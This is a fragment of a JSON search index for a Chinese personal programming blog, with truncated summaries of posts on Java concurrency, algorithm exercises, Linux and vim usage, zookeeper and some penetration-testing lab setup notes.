话，会对代码进行逃逸","lvl0":"synchronized锁优化","lvl1":null,"lvl2":"摘要","objectID":"7edc50102df7a1ecf37e81b3df51f499","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/synchronized%E9%94%81%E4%BC%98%E5%8C%96_%E9%94%81%E5%81%8F%E5%90%91%E7%AD%89/"},{"content":"sz和 rz receive 和 send 1 yum install lrzsz 学习教程 mobaxterm ctrl + 右键点击屏幕","lvl0":"sz 和 rz命令","lvl1":["linux"],"lvl2":"摘要","objectID":"6f365d52def996b7b33753177b6ad232","tags":["linux"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/%E9%83%A8%E7%BD%B2%E6%80%BB%E7%BB%93/sz-%E5%92%8C-rz%E5%91%BD%E4%BB%A4/"},{"content":"题目1. 主机甲向主机乙发送一个(SYN=1,seq=11220)的TCP段,期望与主机乙建立TCP连接,若主机乙接受该连接请求,则主机乙向主","lvl0":"tcp理解刷题","lvl1":null,"lvl2":"摘要","objectID":"fed667b4f851d891ed7dedda741e54b0","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/tcp%E7%90%86%E8%A7%A3%E9%A2%98/"},{"content":"如何理解 Thread-Per-Message 模式 现实世界里，很多事情我们都需要委托他人办理，一方面受限于我们的能力，总有很多搞不定的事，比如教育小朋友，搞不定怎么办呢？只能委","lvl0":"Thread per message 模式","lvl1":null,"lvl2":"摘要","objectID":"18665b766966189d8fc8fd370e0622e2","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/thread-per-message/"},{"content":"ThreadLocal的思想 参考博客 ThreadLocal 思想就是避免共享， 没有共享变量，就不会有并发问题 其本质上就是避免共享。你已经知道通过局部变量可以做到避","lvl0":"ThreadLocal模式","lvl1":null,"lvl2":"摘要","objectID":"156c79090e6118927c36e643db5e6386","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/threadlocal/"},{"content":"tmux 学习 首先screen是Linux中比较常用的可以“接入”和“离开”的shell对话框，很大的方便了我们ssh登录服务器跑任务，如果不用sc","lvl0":"tmux学习","lvl1":null,"lvl2":"摘要","objectID":"4c39d67e33d093c17090155c4653772f","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/tmux/"},{"content":"云计算的三种模式 可以多了解一下云计算的东西 学习教程 iaas paas saas DAAS **DaaS 是Data as a Server的缩写，意思是数据即服务。**云端公司负责建立全部的I","lvl0":"TT面试笔试总结","lvl1":null,"lvl2":"摘要","objectID":"c0016ea8d3956f39521f108788bc3643","tags":["选择题刷题笔记","笔试总结"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AC%94%E8%AF%95%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/tt/"},{"content":"useradd 和 adduser 的区别 在root权限下，useradd只是创建了一个用户名，如 （useradd +用户名 ），它并没有在/home目录下创建同名文件夹，也","lvl0":"useradd 和 adduser","lvl1":null,"lvl2":"摘要","objectID":"0f5e62f4feab3ef3c2ddfb53755936a3","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/useradd-%E5%92%8C-adduser%E7%9A%84%E5%8C%BA%E5%88%AB%E9%87%8D%E7%82%B9%E7%90%86%E8%A7%A3/"},{"content":"vagrant 的使用 1 2 3 vagrant ssh-config # 查看 vagrant的 ssh 配置 # 给 vscode 使用 1 2 3 4 5 6 7 8 9 10 Host defaultHostName 127.0.0.1User vagrantPort 2222UserKnownHostsFile /dev/nullStrictHostKeyChecking noPasswordAuthentication noIdentityFile F:/vagrant/centos7/.vagrant/machines/default/virtualbox/private_keyIdentitiesOnly yesLogLevel FATAL 为了方便使用，还是加个宝塔吧 1 yum install -y wget \u0026amp;\u0026amp; wget","lvl0":"vagrant的使用","lvl1":null,"lvl2":"摘要","objectID":"13b60f9df81374cb7b9479d0a381604b","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/windows10%E5%AD%A6%E4%B9%A0/vagrant%E7%9A%84%E4%BD%BF%E7%94%A8/"},{"content":"插件安装 1 2 mkdir -p ~/.vim/bundle git clone https://github.com/gmarik/Vundle.vim.git ~/.vim/bundle/Vundle.vim 参考博客 安装博客2 我本地配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43","lvl0":"vim插件安装","lvl1":null,"lvl2":"摘要","objectID":"f51205e2ce9bd5c452bcf5e79a2c3b45","tags":["shell命令学习","vim"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/vim%E5%AD%A6%E4%B9%A0/vim%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85/"},{"content":"1. vi的模式 1.1. 普通模式 由Shell进入vi编辑器时，首先进入普通模式。在普通模式下，从键盘输入任何字符都被当作命令来解释。普通模式下没有任何","lvl0":"vim快捷键","lvl1":null,"lvl2":"摘要","objectID":"01a5bdc455b1a7d5d918f9c721d868a9","tags":["shell命令学习","vim"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/vim%E5%AD%A6%E4%B9%A0/vim%E5%BF%AB%E6%8D%B7%E9%94%AE/"},{"content":"vimrc 中文版 由 https://blog.51cto.com/zpf666/2335640 转载 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62","lvl0":"vim配置 .vimrc","lvl1":null,"lvl2":"摘要","objectID":"c0cd5ec312df4041ac8b53be7cf48f36","tags":["shell命令学习","vim"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/vim%E5%AD%A6%E4%B9%A0/vim%E9%85%8D%E7%BD%AE-.vimrc/"},{"content":"可视模式 1、可视模式命令简介 在普通模式下输入 v（小写），进入字符选择模式，就可以移动光标，光标走过的地方就会选取。再次按下v后就会取消选取。","lvl0":"vim学习_可视模式【复制多行】","lvl1":null,"lvl2":"摘要","objectID":"bef06943105b2a384870d183b4b85106","tags":["shell命令学习","vim"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/vim%E5%AD%A6%E4%B9%A0/%E5%8F%AF%E8%A7%86%E6%A8%A1%E5%BC%8F%E9%AA%9A%E6%93%8D%E4%BD%9C%E5%A4%8D%E5%88%B6%E5%A4%9A%E8%A1%8C/"},{"content":"waitGroup 使用方法 比如，我们要完成一个大的任务，需要使用并行的 goroutine 执行三个小任务，只有这三 个小任务都完成，我们才能去执行后面的任务。如果通过轮询的方式","lvl0":"WaitGroup","lvl1":null,"lvl2":"摘要","objectID":"c2f8fde4db747300f2a78f539b63cda1","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E7%90%86%E8%AE%BA/waitgroup/"},{"content":"win7 靶机安装记录 win7 是 2009 年发布的，比较原始， win10 的话 比较高级了 ，很多东西不好操作。 安装教程 点击导航栏 -\u0026gt; 视图， 改为自动缩放模式 中国菜刀安装学习 工具原","lvl0":"win7靶机安装方式","lvl1":null,"lvl2":"摘要","objectID":"48712eac8e3c22b0cb32ccc9a2eaa986","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/windows10%E5%AD%A6%E4%B9%A0/win7%E9%9D%B6%E6%9C%BA%E5%AE%89%E8%A3%85%E6%96%B9%E5%BC%8F/"},{"content":"分区教程 磁盘管理-\u0026gt; 删除 -\u0026gt; 新建简单卷、 学习教程 2","lvl0":"windows10硬盘分区，容量分配","lvl1":null,"lvl2":"摘要","objectID":"ad5932da3b946bb20721ad3333f04ffe","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/windows10%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80/%E5%88%86%E5%8C%BA%E6%95%99%E7%A8%8B/"},{"content":"基于 zookeeper的瞬时节点 实现分布式锁 基本概念 瞬时节点 不能有子节点， 会话连接一旦断开，瞬时节点就会删除 持久节点 可以有子节点 安装和下载 去","lvl0":"zookeeper分布式锁","lvl1":null,"lvl2":"摘要","objectID":"0b1cc85179febe88e097bda77c0da268","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E4%B8%AD%E9%97%B4%E4%BB%B6/zookeeper/zookeeper%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/"},{"content":"zookeeper 是什么 zookeeper 解决了什么问题? ZooKeeper是—个开源的分布式协同服务系统。 ZooKeeper的 设计目标是将那些复杂且容易出错的分布式协同服","lvl0":"zookeeper基础学习0","lvl1":null,"lvl2":"摘要","objectID":"2583f406e3240c084a8d08ab0298405e","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E4%B8%AD%E9%97%B4%E4%BB%B6/zookeeper/zookeeper%E5%9F%BA%E7%A1%80/"},{"content":"安装完VirtualBox4.0.0后，主机多了一个“VirtualBox Host-Only Network ”本地网卡，IP和DNS是自动获取的，在以后的VBox网络配置","lvl0":"安装metasploit","lvl1":null,"lvl2":"摘要","objectID":"3164cb4840bec0d805b667af047b0ad3","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/kali-linux%E5%AD%A6%E4%B9%A0/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9Dwin7/%E6%B8%97%E9%80%8Fwin7/"},{"content":"安装unbuntu子系统笔记 开启虚拟化，开启 windows子系统配置 安装软件【略】 修改root密码 1 2 sudo passwd root # 设置新密码 设置国内 apt镜像源","lvl0":"安装unbuntu子系统学习","lvl1":null,"lvl2":"摘要","objectID":"a2dd8415ac159646a6b2a6fe3a072f86","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/windows10%E5%AD%A6%E4%B9%A0/%E5%AE%89%E8%A3%85unbuntu%E5%AD%90%E7%B3%BB%E7%BB%9F/"},{"content":"输入一个正整数数组，把数组里所有数字拼接起来排成一个数，打印能拼接出的所有数字中最小的一个。 例如输入数组 [3,32,321][3,32,32","lvl0":"把数组排成最小的数","lvl1":null,"lvl2":"摘要","objectID":"0a8483d997419bbd99f24427309cf4f4","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E8%B4%AA%E5%BF%83/%E6%8A%8A%E6%95%B0%E7%BB%84%E6%8E%92%E6%88%90%E6%9C%80%E5%B0%8F%E7%9A%84%E6%95%B0/"},{"content":"预备工作 这边要防止 windows defender 误杀的方法： 添加 排除 .php , .md 文件， 可能会误杀 添加指定文件夹 不要扫描 安装靶机 OWASP Broken Web Applications Project Broken Web Applications（BWA","lvl0":"靶机安装配置","lvl1":null,"lvl2":"摘要","objectID":"dde1aa3e1bddab2de465f8df0a57c4db","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/kali-linux%E5%AD%A6%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AE%9E%E8%B7%B5/%E9%9D%B6%E6%9C%BA%E5%AE%89%E8%A3%85%E7%AD%89%E9%85%8D%E7%BD%AE/"},{"content":"包含min函数的栈 设计一个支持push，pop，top等操作并且可以在$O(1)$时间内检索出最小元素的堆栈。 push(x)–将元素x插入栈","lvl0":"包含min函数的栈","lvl1":null,"lvl2":"摘要","objectID":"8db5d239f850e945e144c9ee7bd96d0d","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E6%A0%88/%E5%8C%85%E5%90%ABmin%E5%87%BD%E6%95%B0%E7%9A%84%E6%A0%88/"},{"content":"乐观锁 需要对表的设计增加额外的字段，增加了数据库的冗余，另外，当应用并发量高的时候，version值在频繁变化，则会导致大量请求失败，影响系","lvl0":"并发，锁","lvl1":null,"lvl2":"摘要","objectID":"0fbb250257c0ba9ee30e847df9c0ecfe","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8/%E5%B9%B6%E5%8F%91_%E9%94%81/"},{"content":"cms 收集器 CMS（Concurrent Mark Sweep）收集器是一种以获取最短回收停顿时间为目标的收集器，基于并发“标记清理”实现,在标记清理过程","lvl0":"并发垃圾回收","lvl1":null,"lvl2":"摘要","objectID":"425ad691f5ce03b7bd721f20f6bf9b6c","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E5%B9%B6%E5%8F%91%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/"},{"content":"相关概念 死锁 活锁 那是不是所有的代码都需要认真分析一遍是否存在这三个问题呢？当然不是，其实只有一种情况需要：存在共享数据并且该数据会发生变化，","lvl0":"并发相关理论","lvl1":null,"lvl2":"摘要","objectID":"0e44fcab185f6b6d5dcdff47f193ac99","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E5%B9%B6%E5%8F%91%E7%9A%84%E7%9B%B8%E5%85%B3%E7%90%86%E8%AE%BA/"},{"content":"给定一个长度为 $n+1$ 的数组nums，数组中所有的数均在 $1∼n$的范围内，其中 $n≥1$。 请找出数组中任意一个重复的数，但不能修改输入的数组。 样","lvl0":"不修改数组找出重复元素","lvl1":null,"lvl2":"摘要","objectID":"8867580ee7c31b53aba9aa02f1b8c4c1","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E9%81%8D%E5%8E%86/%E4%B8%8D%E4%BF%AE%E6%94%B9%E6%95%B0%E7%BB%84%E6%89%BE%E5%87%BA%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0/"},{"content":"写一个函数，求两个整数之和，要求在函数体内不得使用 ＋、－、×、÷＋、－、×、÷ 四则运算符号。 样例 1 2 3 输入：num1 = 1 , num2 = 2 输出：3 代码","lvl0":"不用加减乘除实现加法","lvl1":null,"lvl2":"摘要","objectID":"57c0f5abbe8f9d9c9e6754d34fdcbe34","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E6%95%B0%E5%AD%A6%E9%97%AE%E9%A2%98/%E4%B8%8D%E7%94%A8%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E5%8A%A0%E6%B3%95/"},{"content":"进程的几种状态 就绪： 当进程已分配到除CPU以外的所有必要的资源，只要获得处理机便可立即执行，这时的进程状态称为就绪状态。 执行： 当进程已获得处","lvl0":"操作系统八股文","lvl1":null,"lvl2":"摘要","objectID":"5e22f5338929ff329f2f927a94703d78","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%85%AB%E8%82%A1%E6%96%87/"},{"content":"","lvl0":"操作系统常见的题","lvl1":null,"lvl2":"摘要","objectID":"875cb2b7f7a6c4ccfd8d5bdb7c71b136","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%9C%BA%E6%99%AF%E9%A2%98/"},{"content":"more 命令和文件系统 查看文件more 和 less 命令1： more 作用： 以分页形式显示文件内容 语法: more + 文件名 按回车刷新一行，按空格刷新一屏， 输入 q退出 命令2：","lvl0":"查看文件 more,less,文件系统","lvl1":null,"lvl2":"摘要","objectID":"f0b46a8a35742d7ac1eddf43c28a22c8","tags":["shell命令学习"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6_moreless-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"},{"content":"linux 查漏补缺快捷键总结 ctrl + u, 清空这一行 ctrl + insert 相当于 复制 shift + insert 相当于 黏贴","lvl0":"查漏补缺快捷键总结","lvl1":null,"lvl2":"摘要","objectID":"546271cf3cebc921df595ec7ab42d463","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/%E9%83%A8%E7%BD%B2%E6%80%BB%E7%BB%93/%E6%9F%A5%E6%BC%8F%E8%A1%A5%E7%BC%BA%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%80%BB%E7%BB%93/"},{"content":"常见协议刷题 ICMP 协议 ICMP有两种报文：差错报文、询问报文 ICMP差错报文用于目标主机或到目标主机路径上的路由器向源主机报告差错和异常情况。 五","lvl0":"常见协议刷题","lvl1":null,"lvl2":"摘要","objectID":"cfea5c698e2e8e6eec745ee991a1e0f1","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE%E5%88%B7%E9%A2%98/"},{"content":"类型 grep的操作 findstr 查看端口进程 1 2 netstat -ano | findstr \u0026#34;8080\u0026#34; taskkill /f /pid powershell 的 echo 1 2 PS D:\\ASUS\\Desktop\u0026gt; echo $(( 16 * 7 )) 112 下面 记录linux 下 echo的用法 result = $[ node1 + node2 ] result=$((node1 + node2)) result=expr 7 +","lvl0":"常用的 bat脚本","lvl1":null,"lvl2":"摘要","objectID":"ed80ac633d4d8d44b3de1e68281892e5","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/windows10%E5%AD%A6%E4%B9%A0/bat%E8%84%9A%E6%9C%AC/%E5%B8%B8%E7%94%A8%E7%9A%84bat%E8%84%9A%E6%9C%AC/"},{"content":"常用的解压命令 解压 tar.gz文件 具体可以用 --help 来查看 选项的意思 .tar.gz 意思是 先用tar 压缩，再用gz 进行二次压缩 所以 先用 -z 对 进行解压， 然后再用 xf 对","lvl0":"常用的解压命令","lvl1":null,"lvl2":"摘要","objectID":"0559f668304ca7c8e9e576c18318b5da","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/%E9%83%A8%E7%BD%B2%E6%80%BB%E7%BB%93/%E5%B8%B8%E7%94%A8%E7%9A%84%E8%A7%A3%E5%8E%8B%E5%91%BD%E4%BB%A4/"},{"content":"作者：牛客636793145号 链接：https://www.nowcoder.com/discuss/650653 来源：牛客网 接口和抽象类的","lvl0":"抽象类和接口区别","lvl1":null,"lvl2":"摘要","objectID":"3620526eab59c54c1caf03dbcc13f63c","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8/%E6%8A%BD%E8%B1%A1%E7%B1%BB%E5%92%8C%E6%8E%A5%E5%8F%A3%E5%8C%BA%E5%88%AB/"},{"content":"输入一个整数 n ，求从 1 到 n 这 n 个整数的十进制表示中 1 出现的次数。 例如输入 12 ，从 1 到 12 这些整数中包含 “1” 的数字有 1，10，1 ，10，11 和 12","lvl0":"从1到n中 1出现的次数","lvl1":null,"lvl2":"摘要","objectID":"46b9fec70ac9eaaafcc2aab2a80014bc","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/dp%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E4%BB%8E1%E5%88%B0n%E4%B8%AD1%E5%87%BA%E7%8E%B0%E7%9A%84%E6%AC%A1%E6%95%B0/"},{"content":"从尾到头打印链表 输入一个链表的头结点，按照 从尾到头 的顺序返回节点的值。 返回的结果用数组存储。 样例 1 2 输入：[2, 3, 5] 返回：[5, 3, 2] 1 2 3 4","lvl0":"从尾到头打印链表","lvl1":null,"lvl2":"摘要","objectID":"62a8b0fc15b20c9dc1a51ef6705cafc7","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E9%93%BE%E8%A1%A8/%E4%BB%8E%E5%B0%BE%E5%88%B0%E5%A4%B4%E6%89%93%E5%8D%B0%E9%93%BE%E8%A1%A8/"},{"content":"登录页面制作总结 遇到的困难 内元素 设置 margin-top 影响外元素 解决的方法 1 2 3 4 #root { overflow:hidden } 设置 overflow 就不会被子元素影响了 ant-design icon兼容性为 1 // import { Icon } from \u0026#39;@ant-design/compatible\u0026#39;; 不错的","lvl0":"登录页面制作","lvl1":null,"lvl2":"摘要","objectID":"dd98af264917bb2e1c5197f570528427","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/react%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/react%E9%A1%B9%E7%9B%AE%E8%AE%B0%E5%BD%95/%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2/%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%E5%88%B6%E4%BD%9C%E6%80%BB%E7%BB%93/"},{"content":"定位死锁的工具 如何定位死锁呢？ 可以用 jps 和 jstack 打印内存的信息 学习视频 怎么防止死锁【java编程】 作者：peonyX 链接：https://www.","lvl0":"定位死锁的工具","lvl1":null,"lvl2":"摘要","objectID":"fba7ba5c80317d5db34be7781cafeb23","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E9%9D%A2%E8%AF%95%E5%BF%85%E9%97%AE_%E5%AE%9A%E4%BD%8D%E6%A3%80%E6%B5%8B%E6%AD%BB%E9%94%81/"},{"content":"请实现一个函数，用来判断一棵二叉树是不是对称的。 如果一棵二叉树和它的镜像一样，那么它是对称的。 样例 1 2 3 4 5 6 7 8 9 10 11 12 13 如下图所示二叉树","lvl0":"对称二叉树","lvl1":null,"lvl2":"摘要","objectID":"54fe1b9518121b964ce5245032fd1fda","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%AF%B9%E7%A7%B0%E4%BA%8C%E5%8F%89%E6%A0%91/"},{"content":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 .: 选择题也经常考，之前转转笔试就考了 .: 8:1:1 江: 这个我知道 江: 他问我你们项目是怎么调整的 江: 新生：老年 1","lvl0":"怼项目","lvl1":["八股文"],"lvl2":"摘要","objectID":"ecfb209a24f8a94043209a69a2d7263f","tags":["八股文"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/java%E5%85%AB%E8%82%A1%E6%B7%B1%E6%8C%96/%E6%80%BC%E9%A1%B9%E7%9B%AE/"},{"content":"输入一个整数数组，判断该数组是不是某二叉搜索树的后序遍历的结果。 如果是则返回true，否则返回false。 假设输入的数组的任意两个数字都互不","lvl0":"二叉树的后序遍历序列","lvl1":null,"lvl2":"摘要","objectID":"cbecba729c65e6107ffee6495599096a","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97/"},{"content":"二叉树的下一个节点 给定一棵二叉树的其中一个节点，请找出中序遍历序列的下一个节点。 注意： 